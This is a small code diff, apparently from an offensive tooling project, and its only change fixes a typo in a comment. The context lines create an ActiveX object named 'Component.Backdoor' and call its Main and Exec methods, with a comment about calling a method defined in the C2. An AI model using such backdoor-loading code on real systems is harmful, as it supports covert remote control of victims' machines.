@@ -4,7 +4,7 @@
 var x = new ActiveXObject("Component.Backdoor");
 x.Main();
 
-//After That, Just Call your method ddefined in the c2 :-)
+//After That, Just Call your method defined in the c2 :-)
 var x = new ActiveXObject("Component.Backdoor");
 x.Exec();
 
